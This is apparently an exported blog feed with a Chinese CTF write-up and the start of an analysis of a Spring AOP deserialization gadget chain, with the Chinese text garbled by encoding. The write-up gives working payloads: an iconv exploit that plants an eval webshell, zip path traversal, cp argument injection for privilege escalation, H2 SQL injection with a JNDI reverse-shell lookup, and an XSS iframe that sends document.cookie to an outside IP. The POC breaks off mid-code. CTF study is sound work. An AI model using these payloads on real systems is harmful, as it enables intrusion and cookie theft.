[{"categories":["WP"],"contents":"Gavatar ä¸€ä¸ªphpæœåŠ¡\nè¿™é‡Œçœ‹upload.phpæœ‰ç€å¾ˆæ˜æ˜¾çš„ä»»æ„æ–‡ä»¶è¯»çš„æ¼æ´ï¼Œåªéœ€è¦postä¸€ä¸ªurlå‚æ•°å°±å¯ä»¥\nif (!empty($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-\u0026gt;file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;]), [\u0026#39;image/jpeg\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/gif\u0026#39;])) { die(\u0026#39;Invalid file type\u0026#39;); } move_uploaded_file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;], $avatarPath); } elseif (!empty($_POST[\u0026#39;url\u0026#39;])) { $image = @file_get_contents($_POST[\u0026#39;url\u0026#39;]); if ($image === false) die(\u0026#39;Invalid URL\u0026#39;); file_put_contents($avatarPath, $image); } flagä¹Ÿä¸èƒ½ç›´æ¥è¯»ï¼Œéœ€è¦rceè°ƒç”¨/readflagï¼Œç„¶åå°±å¼€å§‹æƒ³èƒ½ä¸èƒ½å’Œå…¶ä»–phpæ–‡ä»¶ä¸‹çš„æ¼æ´ä¸€èµ·åˆ©ç”¨\nä¹Ÿæ˜¯æ²¡æœ‰å…¶ä»–èƒ½å¤Ÿæ¥ç€åˆ©ç”¨çš„æ¼æ´äº†ï¼Œç„¶åçœ‹åˆ°phpç‰ˆæœ¬æ˜¯8.3.4ï¼Œå°±æƒ³åˆ°é‚£ä¸ªiconvçš„æ¼æ´åˆ©ç”¨\nhttps://www.ambionics.io/blog/iconv-cve-2024-2961-p1\nå› ä¸ºä¸æ˜¯ç›´æ¥è¿”å›æ–‡ä»¶å†…å®¹ï¼Œè€Œæ˜¯éœ€è¦æˆ‘ä»¬ä»avatar.phpä¸­è·å–ï¼Œè¿™é‡Œéœ€è¦ç¨å¾®æ”¹ä¸€ä¸‹è„šæœ¬ä¸­çš„downloadå‡½æ•°ï¼Œè¦æå‰æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åæŠŠsessionå’Œuserå¡«ä¸Šå³å¯\ndef download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; self.send(path) response=self.session.get(\u0026#34;http://39.106.16.204:20871/avatar.php?user=123\u0026#34;) print(response) data = response.text return base64.decode(data) ç„¶åè·‘expå°±å¥½äº†\npython test.py http://39.106.16.204:20871/upload.php \u0026#34;echo \u0026#39;\u0026lt;?=@eval(\\$_POST[0]);?\u0026gt;\u0026#39; \u0026gt; shell.php\u0026#34; tarefik goæœåŠ¡ï¼Œä»£ç å¾ˆå°‘ï¼Œåªæœ‰ä¸€ä¸ªmain.go,è¿™é‡Œå¯ä»¥çœ‹åˆ°ç›´æ¥å†™äº†ä¸€ä¸ªflagæ¥å£è·å–flag\nr.GET(\u0026#34;/flag\u0026#34;, func(c *gin.Context) { xForwardedFor := c.GetHeader(\u0026#34;X-Forwarded-For\u0026#34;) if !strings.Contains(xForwardedFor, \u0026#34;127.0.0.1\u0026#34;) { c.JSON(400, gin.H{\u0026#34;error\u0026#34;: \u0026#34;only localhost can get flag\u0026#34;}) return } flag := os.Getenv(\u0026#34;FLAG\u0026#34;) if flag == \u0026#34;\u0026#34; { flag = \u0026#34;flag{testflag}\u0026#34; } c.String(http.StatusOK, flag) }) ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä»Dockerfileé‡Œé¢çœ‹åˆ°å®é™…ä¸Šå¹¶ä¸æ˜¯ç›´æ¥å°†æœåŠ¡æš´éœ²åœ¨å¤–ç½‘ï¼Œè€Œæ˜¯ä½¿ç”¨äº†tarefikè¿›è¡Œäº†ä¸€ä¸ªä»£ç†è½¬å‘\ntraefik.yml\nproviders: file: filename: /app/.config/dynamic.yml entrypoints: web: address: \u0026#34;:80\u0026#34; dynamic.yml\nhttp: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy åªè½¬å‘äº†indexå’Œuploadä¸¤ä¸ªæ¥å£\næˆ‘ä»¬è¿™é‡Œå¯ä»¥ä»å®˜æ–¹æ–‡æ¡£çŸ¥é“ï¼Œè½¬å‘ç«¯å£è¿™ä¸€äº›çš„æœåŠ¡é…ç½®ï¼Œéƒ½æ˜¯å¯ä»¥çƒ­åŠ è½½çš„\né‚£æˆ‘ä»¬æ¥ä¸‹æ¥çš„ç›®çš„å°±æ˜¯æƒ³èƒ½å¦å¯ä»¥é‡å†™dynamic.ymlï¼Œå†™å…¥æˆ‘ä»¬çš„é…ç½®ï¼Œå°†flagç«¯å£è½¬å‘å‡ºæ¥å°±èƒ½è¾¾åˆ°getflag\næˆ‘ä»¬å°†ç›®å…‰è½¬åˆ°uploadæ¥å£ä¸Š\nr.POST(\u0026#34;/public/upload\u0026#34;, func(c *gin.Context) { file, err := c.FormFile(\u0026#34;file\u0026#34;) if err != nil { c.JSON(400, gin.H{\u0026#34;error\u0026#34;: \u0026#34;File upload failed\u0026#34;}) return } randomFolder := randFileName() destDir := filepath.Join(uploadDir, randomFolder) if err := os.MkdirAll(destDir, 0755); err != nil { c.JSON(500, gin.H{\u0026#34;error\u0026#34;: \u0026#34;Failed to create directory\u0026#34;}) return } zipFilePath := filepath.Join(uploadDir, randomFolder+\u0026#34;.zip\u0026#34;) if err := c.SaveUploadedFile(file, zipFilePath); err != nil { c.JSON(500, gin.H{\u0026#34;error\u0026#34;: \u0026#34;Failed to save uploaded file\u0026#34;}) return } if err := unzipFile(zipFilePath, destDir); err != nil { c.JSON(500, gin.H{\u0026#34;error\u0026#34;: \u0026#34;Failed to unzip file\u0026#34;}) return } c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: fmt.Sprintf(\u0026#34;File uploaded and extracted successfully to %s\u0026#34;, destDir), }) }) unzipFile\nfunc unzipFile(zipPath, destDir string) error { zipReader, err := zip.OpenReader(zipPath) if err != nil { return err } defer zipReader.Close() for _, file := range zipReader.File { filePath := filepath.Join(destDir, file.Name) if file.FileInfo().IsDir() { if err := os.MkdirAll(filePath, file.Mode()); err != nil { return err } } else { err = unzipSimpleFile(file, filePath) if err != nil { return err } } } return nil } è¿™é‡Œéœ€è¦æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªzipæ–‡ä»¶ï¼Œç„¶åæ”¾åˆ°unzipFileå‡½æ•°ä¸‹è¿›è¡Œä¸€ä¸ªè§£å‹\nçœ‹åˆ°unzipFileä¸­ä½¿ç”¨äº†filepath.Joinåï¼Œè”æƒ³åˆ°äº†pythoné‡Œçš„path.joinï¼Œæƒ³ç€èƒ½å¦æŠŠå‹ç¼©åŒ…å†…çš„æ–‡ä»¶åå†™æˆ../å¼€å¤´çš„å½¢å¼ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±èƒ½æˆåŠŸç›®å½•ç©¿è¶Šï¼Œç„¶åè¦†ç›–é…ç½®æ–‡ä»¶äº†\nå°è¯•å‡ºæ¥æ˜¯å¯ä»¥çš„ï¼Œè¿™é‡Œæˆ‘å†™äº†ä¸ªpythonè„šæœ¬æ¥è¾¾åˆ°ç›®çš„\nimport zipfile if __name__ == \u0026#34;__main__\u0026#34;: try: binary=open(\u0026#34;config/dynamic.yml\u0026#34;,\u0026#34;r\u0026#34;).read() zipFile = zipfile.ZipFile(\u0026#34;test2.zip\u0026#34;, \u0026#34;w\u0026#34;, zipfile.ZIP_DEFLATED) info = zipfile.ZipInfo(\u0026#34;test2.zip\u0026#34;) zipFile.writestr(\u0026#34;../../.config/dynamic.yml\u0026#34;, binary) zipFile.writestr(\u0026#34;1234.txt\u0026#34;,binary) zipFile.close() except IOError as e: raise e ç„¶ådynamic.ymlå†…å®¹å¦‚ä¸‹,ç”±äºXFFå¤´çš„å­˜åœ¨ï¼Œæˆ‘ä»¬è¿˜éœ€è¦é¢å¤–åŠ ä¸€ä¸ªæ·»åŠ è¯·æ±‚å¤´çš„ä¸­é—´ä»¶\nhttp: middlewares: # å®šä¹‰æ·»åŠ è¯·æ±‚å¤´çš„ä¸­é—´ä»¶ add-headers: headers: customRequestHeaders: X-Forwarded-For: 127.0.0.1 services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy middlewares: - add-headers # åº”ç”¨ä¸­é—´ä»¶ upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy middlewares: - add-headers # åº”ç”¨ä¸­é—´ä»¶ flag: rule: Path(`/flag`) entrypoints: [web] service: proxy middlewares: - add-headers backup åœ¨htmlçš„æœ€ä¸‹é¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ³¨é‡Š\nç„¶åæˆ‘ä»¬ç®€å•ç»•ä¸€ä¸‹éæ³•ä¼ å‚åå°±å¯ä»¥äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªshellæ¥å£ï¼Œæˆ‘ä»¬èƒ½å¤Ÿç›´æ¥å‘å‘½ä»¤,æ‰€ä»¥è¿™é‡Œå¼¹ä¸ªshellæ–¹ä¾¿æ¥ä¸‹æ¥çš„æ“ä½œ\nflagæ˜¯400æƒé™ï¼Œæˆ‘ä»¬è¿™é‡Œéœ€è¦ææƒ\næ ¹ç›®å½•ä¸‹é¢å‘ç°äº†ä¸€ä¸ªbackup.shï¼Œå†…å®¹å¦‚ä¸‹\n#!/bin/bash cd /var/www/html/primary while : do cp -P * /var/www/html/backup/ chmod 755 -R /var/www/html/backup/ sleep 15s done ä¸€ä¸ªæ­»å¾ªç¯ï¼Œé‡å¤è¿›è¡Œäº†cp chmodçš„æ“ä½œ\nè¿™é‡Œæˆ‘å»ps auxçœ‹äº†ä¸€çœ¼ï¼Œæ˜¯rootä¸€ç›´åœ¨æ‰§è¡Œ\né‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯åœ¨è¿™ä¸ªbackup.shä¸Šåšä¸‹ä¸€æ­¥æ“ä½œäº†\næˆ‘ä»¬æƒ³è¦çš„æ˜¯èƒ½å¦åœ¨primaryç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæŒ‡å‘/flagçš„è½¯è¿æ¥ï¼Œç„¶åcpå°†è½¯è¿æ¥æ‰€æŒ‡å‘çš„flagæ–‡ä»¶å¤åˆ¶åˆ°backupæ–‡ä»¶å¤¹ä¸‹ï¼Œå†åˆ©ç”¨å†…éƒ¨è‡ªå¸¦çš„chmodå‘½ä»¤ä½¿æˆ‘ä»¬å¯è¯»\nä½†æ˜¯è¿™é‡Œcpä½¿ç”¨äº†-På‚æ•°ï¼Œåœ¨helpä¸­å¯¹è¯¥å‚æ•°è§£é‡Šå¦‚ä¸‹\n-P, --no-dereference never follow symbolic links in SOURC è¿™ä¸æ˜¯å¯„äº†å—?\nä½†æ˜¯cpçš„å¯¹è±¡æ˜¯*å‚æ•°ï¼Œè¿™ä¸ª*å‚æ•°å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ³¨å…¥å‚æ•°é¡¹(ä¸€äº›å‘½ä»¤çš„ææƒæ‰‹æ³•å°±æ˜¯ç”¨åˆ°è¿™ä¸ªæ“ä½œæ¯”å¦‚chmod tarç­‰ç­‰,ä¸äº†è§£çš„å¯ä»¥ä¸Šç½‘æœæœ)\næˆ‘ä»¬æƒ³è¦çš„å‚æ•°é¡¹æ˜¯è¿™ä¸ª,å…è®¸å¤åˆ¶è½¯è¿æ¥æ‰€å¯¹åº”çš„æ–‡ä»¶\n-L, --dereference always follow symbolic links in SOURCE ç”±äºä¸¤ä¸ªç›¸åçš„å‚æ•°ä¼šè¢«ä½ç½®è¾ƒåçš„å‚æ•°æ‰€è¦†ç›–ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çš„æ“ä½œå°±æ˜¯\nåˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸º-Lçš„æ–‡ä»¶ åˆ›å»ºæŒ‡å‘flagçš„è½¯è¿æ¥ ç­‰shæ‰§è¡Œ cat flag å‘½ä»¤å¦‚ä¸‹\ncd /var/www/html/primary \u0026gt;-L ln -s /flag flag cd ../backup cat flag EasyDB æœåŠ¡ç»™æˆ‘ä»¬çš„æœ‰ç”¨æ¥å£åªæœ‰ä¸€ä¸ªç™»é™†æ¥å£\n@PostMapping({\u0026#34;/login\u0026#34;}) public String handleLogin(@RequestParam String username, @RequestParam String password, HttpSession session, Model model) throws SQLException { if (this.userService.validateUser(username, password)) { session.setAttribute(\u0026#34;username\u0026#34;, username); return \u0026#34;redirect:/\u0026#34;; } else { model.addAttribute(\u0026#34;error\u0026#34;, \u0026#34;Invalid username or password\u0026#34;); return \u0026#34;login\u0026#34;; } } validateUserä¸­å­˜åœ¨ç€sqlæ³¨å…¥æ¼æ´\npublic boolean validateUser(String username, String password) throws SQLException { String query = String.format(\u0026#34;SELECT * FROM users WHERE username = \u0026#39;%s\u0026#39; AND password = \u0026#39;%s\u0026#39;\u0026#34;, username, password); if (!SecurityUtils.check(query)) { return false; } else { Throwable var8; try (Statement stmt = this.connection.createStatement()) { stmt.executeQuery(query); ResultSet resultSet = stmt.getResultSet(); Throwable var7 = null; try { var8 = resultSet.next(); } catch (Throwable var31) { var8 = var31; var7 = var31; throw var31; } finally { if (resultSet != null) { if (var7 != null) { try { resultSet.close(); } catch (Throwable var30) { var7.addSuppressed(var30); } } else { resultSet.close(); } } } } return (boolean)var8; } } ç„¶åæ•°æ®åº“ç±»å‹æ˜¯h2æ•°æ®åº“ï¼Œä¸”executeQuery()æ”¯æŒè§£æå¤šæ¡è¯­å¥ï¼Œé‚£å°±æ˜¯å¾ˆå¹³å¸¸çš„h2æ‰“æ³•äº†ï¼Œå› ä¸ºé¢˜ç›®å‡ºç½‘ï¼Œç»•é»‘åå•æˆ‘ç”¨çš„æ˜¯JNDIæ³¨å…¥ï¼Œä¸è¿‡ä¸å‡ºç½‘çš„è¯ä¹Ÿå¯ä»¥æ‰“å…¶ä»–çš„ï¼Œæ–¹æ³•å¾ˆå¤š\npayloadå¦‚ä¸‹\nadmin\u0026#39;;CREATE ALIAS abc AS \u0026#39;String rce(String cmd) throws Exception { new javax.naming.InitialContext().lookup(cmd); return \u0026#34;123\u0026#34;;}\u0026#39;;--\u0026amp;password=123 admin\u0026#39;;CALL abc (\u0026#39;ldap://ip:1389/Deserialize/Jackson/Command/åå¼¹shellå‘½ä»¤\u0026#39;);--\u0026amp;password=123 display è¿™é¢˜çŒªäº†ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯DOMPurifyçš„0dayï¼Œçœ‹äº†ä¸€ä¸ªå¤šå°æ—¶æ²¡æˆç›´æ¥è·‘è·¯ç©æ¸¸æˆå»äº†\nç¬¬äºŒå¤©çœ‹åˆ°hintå‡ºäº†ä¹‹åå¾ˆå¿«å°±æœ‰äººè§£äº†æ‰è¿”å›æ¥çœ‹è¿™é“é¢˜,ç»“æœæ‰å‘ç°\nconst sanitizedText = sanitizeContent(atob(decodeURI(queryText))); console.log(sanitizedText) if (sanitizedText.length \u0026gt; 0) { textInput.innerHTML = sanitizedText; // å†™å…¥é¢„è§ˆåŒº contentDisplay.innerHTML = textInput.innerText; // å†™å…¥æ•ˆæœæ˜¾ç¤ºåŒº insertButton.disabled = false; } else { textInput.innerText = \u0026#34;Only allow h1, h2 tags and plain text\u0026#34;; } è¿™é‡ŒcontentDisplayçš„å€¼æ˜¯textInputçš„innerTextå•Š(å°±æ˜¯textInputåœ¨æµè§ˆå™¨ä¸Šå±•ç¤ºçš„å­—ç¬¦)\né‚£å°±å¯ä»¥å¾ˆç®€å•çš„åˆ©ç”¨htmlå®ä½“ç¼–ç æ¥ç»•è¿‡\nå¯ä»¥çœ‹åˆ°å¾ˆæˆåŠŸçš„æ’å…¥æˆ‘ä»¬çš„æ ‡ç­¾ï¼Œä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰è¢«DOMæ‰€æ¸²æŸ“ï¼Œè¿™é‡Œå°±ç”¨åˆ°hintäº†\næˆ‘ä»¬ä½¿ç”¨iframeæ¡†æ¶æ¥æ’å…¥script\n\u0026lt;iframe srcdoc=\u0026#34;\u0026lt;script src=\u0026#39;/a/;fetch(%60http://111.229.198.6:5000/%60+document.cookie);//\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œäº†ï¼Œä¹ŸæˆåŠŸè¢«cspæ‹¦äº†(\næ¥ä¸‹æ¥çš„ç»•cspå°±å…¶å®å¾ˆç®€å•äº†ï¼Œåœ¨å‰æ®µæ—¶é—´çš„sekaiCTFåšè¿‡ç›¸åŒçš„é¢˜\nhttps://www.justus.pw/writeups/sekai-ctf/tagless.html\nå°±æ˜¯åˆ©ç”¨äº†404çš„é¡µé¢æ¥å†™å…¥æˆ‘ä»¬çš„jsä»£ç ï¼Œå†ç”¨srcè¿›è¡Œå¼•å…¥å°±è¡Œäº†\nè¿™é‡Œä¸è®²å¤ªå¤šï¼Œç›´æ¥è´´payload\n\u0026lt;iframe srcdoc=\u0026#34;\u0026lt;script src=\u0026#39;/a/;fetch(%60http://ip:5000/%60+document.cookie);//\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; ","date":"2025-02-11T23:00:00+08:00","permalink":"http://localhost:1313/post/2025n1junior-wp/","section":"post","tags":null,"title":"[2025]N1junior-WP"},{"categories":["Javaå®‰å…¨"],"contents":"å‰è¨€ åœ¨æµè§ˆæ–‡ç« çš„æ—¶å€™çœ‹è§æœ‰å¸ˆå‚…å‘ç°äº†ä¸€æ¡ä»…ä¾èµ–äºSpringbootä¸­çš„SpringAOPçš„é“¾ï¼Œäºæ˜¯è‡ªå·±è°ƒè¯•å­¦ä¹ äº†ä¸€ä¸‹\næ­£æ–‡ ä¾èµ–äºSpring-AOPå’Œaspectjweaverä¸¤ä¸ªåŒ…ï¼Œä½†æ˜¯springbootä¸­çš„spring-boot-starter-aopè‡ªå¸¦åŒ…å«è¿™ä¿©ç±»\næµç¨‹ è°ƒç”¨é“¾å¦‚ä¸‹\nJdkDynamicAopProxy.invoke()-\u0026gt;\rReflectiveMethodInvocation.proceed()-\u0026gt;\rAspectJAroundAdvice-\u0026gt;invoke-\u0026gt;\rorg.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()-\u0026gt;\rmethod.invoke() æ‰§è¡Œç±»æ˜¯org.springframework.aop.aspectj.AbstractAspectJAdviceçš„invokeAdviceMethodWithGivenArgsæ–¹æ³•\nprotected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable {\rObject[] actualArgs = args;\rif (this.aspectJAdviceMethod.getParameterCount() == 0) {\ractualArgs = null;\r}\rtry {\rReflectionUtils.makeAccessible(this.aspectJAdviceMethod);\rreturn this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs);\r} catch (IllegalArgumentException ex) {\rthrow new AopInvocationException(\u0026#34;Mismatch on arguments to advice method [\u0026#34; + this.aspectJAdviceMethod + \u0026#34;]; pointcut expression [\u0026#34; + this.pointcut.getPointcutExpression() + \u0026#34;]\u0026#34;, ex);\r} catch (InvocationTargetException ex) {\rthrow ex.getTargetException();\r}\r} ç›´æ¥åœ¨AOPä¾èµ–ä¸‹çš„ä¸€ä¸ªsinkç‚¹ï¼Œæœ‰ç€åå°„æ‰§è¡Œä»»æ„æ–¹æ³•çš„èƒ½åŠ›ï¼Œæ“ä½œç©ºé—´å¾ˆå¤§\nåœ¨ä»–çš„å®ç°å­ç±»ï¼Œåœ¨ä»–çš„å­ç±»åŸºæœ¬ä¸Šinvoke(before)æ–¹æ³•çš„éƒ½è°ƒç”¨äº†ä»–çš„invokeAdviceMethodæ–¹æ³•çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•èƒ½å¤Ÿè°ƒç”¨invoke(before)å³å¯\nç„¶åä¸‹ä¸€æ­¥æ‰¾åˆ°äº†ReflectiveMethodInvocationç±»,ä»–çš„proceedå°±èƒ½å¤Ÿæ»¡è¶³æˆ‘ä»¬ä¸Šé¢çš„è¦æ±‚\næ¥ä¸‹æ¥åœ¨JdkDynamicAopProxyçš„invokeæ–¹æ³•å°†ä¼šè°ƒç”¨proceedæ–¹æ³•\nè¿™é‡Œæœ‰ä¸€ç‚¹å¾ˆæœ‰è¶£ï¼Œå°±æ˜¯ReflectiveMethodInvocationç±»æ˜¯æ²¡æœ‰å®ç°serializableæ¥å£çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½å°†è¿™ä¸ªç±»æ”¾è¿›æˆ‘ä»¬çš„writeObjecté‡Œé¢ï¼Œä½†æ˜¯åœ¨JdkDynamicAopProxyç›´æ¥å¸®æˆ‘ä»¬newäº†ä¸€ä¸ªæ–°çš„å‡ºæ¥,ä¹Ÿæ˜¯å¾ˆå·§äº†\nç„¶åæµç¨‹å¤§è‡´å°±æ˜¯è¿™æ ·ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¯´ä¸€ä¸‹payloadæ‰§è¡Œä¸­çš„ä¸€äº›çŸ¥è¯†ç‚¹\næ„å»ºpayloadä¸­æ‰€éœ€æ³¨æ„çš„ è§¦å‘JdkDynamicAopProxyçš„invokeæ–¹æ³•æœ‰å¾ˆå¤šç§æ“ä½œæ–¹å¼äº†ï¼Œä»invokeçš„è§¦å‘æµç¨‹æ¥çœ‹ï¼Œä¸‹é¢è¿™ä¿©methodæ˜¯è‚¯å®šè§¦å‘ä¸äº†è¿™æ¡é“¾å­çš„ï¼Œä¼šæå‰returnå¯¼è‡´æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»£ç æ²¡æ‰§è¡Œåˆ°\nhashcode()\requals() æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä½¿ç”¨äº†å¹³å¸¸éå¸¸å¸¸è§çš„toStringå…¥å£ç±»\nä¸Šé¢æµç¨‹çš„å›¾ç‰‡ä¹Ÿçœ‹åˆ°äº†ï¼Œå¦‚æœè¦èµ°åˆ°proceedæ–¹æ³•é‚£é‡Œï¼Œé‚£é¦–å…ˆè¿˜å¾—è¿‡ä¸€ä¸‹chain.isEmpty()è¿™ä¸ªåˆ¤æ–­\nchainç”±ä»¥ä¸‹ä»£ç äº§ç”Ÿ\nList\u0026lt;Object\u0026gt; chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass); public List\u0026lt;Object\u0026gt; getInterceptorsAndDynamicInterceptionAdvice(Method method, @Nullable Class\u0026lt;?\u0026gt; targetClass) {\rMethodCacheKey cacheKey = new MethodCacheKey(method);\rList\u0026lt;Object\u0026gt; cached = (List)this.methodCache.get(cacheKey);\rif (cached == null) {\rcached = this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice(this, method, targetClass);\rthis.methodCache.put(cacheKey, cached);\r}\rreturn cached;\r} å› ä¸ºmethodCacheç”±transientä¿®é¥°ï¼Œä¸èƒ½åœ¨ååºåˆ—åŒ–ä¸­è¢«æ¢å¤ï¼Œæ‰€ä»¥è¿™é‡Œçš„methodCacheä¸€å¼€å§‹ä¸€å®šä¸ºç©ºï¼Œé‚£æˆ‘ä»¬å°±è¦çœ‹åˆ°getInterceptorsAndDynamicInterceptionAdviceæ–¹æ³•äº†\nadvisorChainFactoryå¯¹åº”çš„æ¥å£å®ç°ç±»åªæœ‰DefaultAdvisorChainFactoryï¼Œè¿™é‡Œåªèƒ½çœ‹çœ‹å®ƒçš„\npublic List\u0026lt;Object\u0026gt; getInterceptorsAndDynamicInterceptionAdvice(Advised config, Method method, @Nullable Class\u0026lt;?\u0026gt; targetClass) {\rAdvisorAdapterRegistry registry = GlobalAdvisorAdapterRegistry.getInstance();\rAdvisor[] advisors = config.getAdvisors();\rList\u0026lt;Object\u0026gt; interceptorList = new ArrayList(advisors.length);\rClass\u0026lt;?\u0026gt; actualClass = targetClass != null ? targetClass : method.getDeclaringClass();\rBoolean hasIntroductions = null;\rfor(Advisor advisor : advisors) {\rif (advisor instanceof PointcutAdvisor) {\rPointcutAdvisor pointcutAdvisor = (PointcutAdvisor)advisor;\rif (config.isPreFiltered() || pointcutAdvisor.getPointcut().getClassFilter().matches(actualClass)) {\rMethodMatcher mm = pointcutAdvisor.getPointcut().getMethodMatcher();\rboolean match;\rif (mm instanceof IntroductionAwareMethodMatcher) {\rif (hasIntroductions == null) {\rhasIntroductions = hasMatchingIntroductions(advisors, actualClass);\r}\rmatch = ((IntroductionAwareMethodMatcher)mm).matches(method, actualClass, hasIntroductions);\r} else {\rmatch = mm.matches(method, actualClass);\r}\rif (match) {\rMethodInterceptor[] interceptors = registry.getInterceptors(advisor);\rif (mm.isRuntime()) {\rfor(MethodInterceptor interceptor : interceptors) {\rinterceptorList.add(new InterceptorAndDynamicMethodMatcher(interceptor, mm));\r}\r} else {\rinterceptorList.addAll(Arrays.asList(interceptors));\r}\r}\r}\r} else if (advisor instanceof IntroductionAdvisor) {\rIntroductionAdvisor ia = (IntroductionAdvisor)advisor;\rif (config.isPreFiltered() || ia.getClassFilter().matches(actualClass)) {\rInterceptor[] interceptors = registry.getInterceptors(advisor);\rinterceptorList.addAll(Arrays.asList(interceptors));\r}\r} else {\rInterceptor[] interceptors = registry.getInterceptors(advisor);\rinterceptorList.addAll(Arrays.asList(interceptors));\r}\r}\rreturn interceptorList;\r} æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œä¸ç®¡æ˜¯é‚£ç§æ–¹å¼æ·»åŠ è¿›å…¥interceptorListçš„ï¼Œå…¶æ‰€å¯¹åº”çš„æˆå‘˜å¾€å¾€æ˜¯ä»registry.getInterceptors(advisor);æ¥çš„\né‚£è¿™é‡Œæˆ‘ä»¬é¡ºè—¤æ‘¸ç“œ,registryæ‰€å¯¹åº”çš„ç±»æ˜¯DefaultAdvisorAdapterRegistry\nå¯¹åº”çš„getInterceptorsä»£ç å¦‚ä¸‹\né‚£è¿™é‡Œæˆ‘ä»¬åªæœ‰ä»ç¬¬ä¸€ä¸ªåˆ¤æ–­å£è¿›å…¥æ‰èƒ½å¤Ÿæ·»åŠ interceptorsï¼Œä¸è¿‡è¦æ±‚æ˜¯æˆ‘ä»¬çš„advisorå¿…é¡»å®ç°äº†MethodInterceotoræ¥å£,ç®€å•çœ‹äº†ä¸€ä¸‹ç»§æ‰¿å…³ç³»ï¼Œå’Œæ–‡ç« å¸ˆå‚…é‡Œå¾—å‡ºçš„ç»“è®ºä¸€æ ·ï¼šæ²¡æœ‰åŒæ—¶å®ç°äº†è¯¥æ¥å£çš„advisorç±»\né¢å¯¹æ­¤ç§æƒ…å†µï¼Œæˆ‘ä»¬ä½¿ç”¨äº†åŠ¨æ€ä»£ç†å»å°†MethodInterceotorç»™advisorç±»ä»£ç†ä¸Šï¼Œä½¿å…¶å®ç°åŒæ¥å£\nè¿™é‡Œåˆç”¨åˆ°äº†ä¸€æ¬¡JdkDynamicAopProxy,ä¸è¿‡å’Œå‰é¢çš„ä½œç”¨å®Œå…¨ä¸åŒ\nç„¶åè¿™é‡Œå°±èƒ½å¤Ÿé¡ºåˆ©returnå›æˆ‘ä»¬æƒ³è¦çš„interceptors,chainä¹Ÿèƒ½æ‰§è¡Œåˆ°æˆ‘ä»¬çš„proceedæ–¹æ³•äº†\næœ€åå°±æ˜¯åœ¨æˆ‘ä»¬çš„org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgsä¸­\nthis.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs); è¿™é‡Œè¿˜è¦ä»aspectInstanceFactoryä¸­è·å–åˆ°ä¸€ä¸ªæ–¹æ³•ç±»çš„å®ä¾‹,æ–‡ç« ä¸­æ˜¯ä½¿ç”¨äº†SingletonAspectInstanceFactoryè¿™ä¸ªç±»\nå’ŒCCé‡Œçš„ConstantTransformerå¾ˆç›¸ä¼¼\nPOC import Utils.Util;\rimport com.fasterxml.jackson.databind.node.POJONode;\rimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\rimport javassist.ClassPool;\rimport javassist.CtClass;\rimport javassist.CtConstructor;\rimport org.aopalliance.aop.Advice;\rimport org.aopalliance.intercept.MethodInterceptor;\rimport org.springframework.aop.aspectj.AbstractAspectJAdvice;\rimport org.springframework.aop.aspectj.AspectJAroundAdvice;\rimport org.springframework.aop.aspectj.AspectJExpressionPointcut;\rimport org.springframework.aop.aspectj.SingletonAspectInstanceFactory;\rimport org.springframework.aop.framework.AdvisedSupport;\rimport org.springframework.aop.support.DefaultIntroductionAdvisor;\rimport org.springframework.core.Ordered;\rimport java.lang.reflect.*;\rimport java.util.PriorityQueue;\rimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\rimport javax.management.BadAttributeValueExpException;\rimport javax.xml.transform.Templates;\rpublic class main {\rpublic static void main(String[] args) throws Exception {\rClassPool pool = ClassPool.getDefault();\rCtClass clazz = pool.makeClass(\u0026#34;a\u0026#34;);\rCtClass superClass = 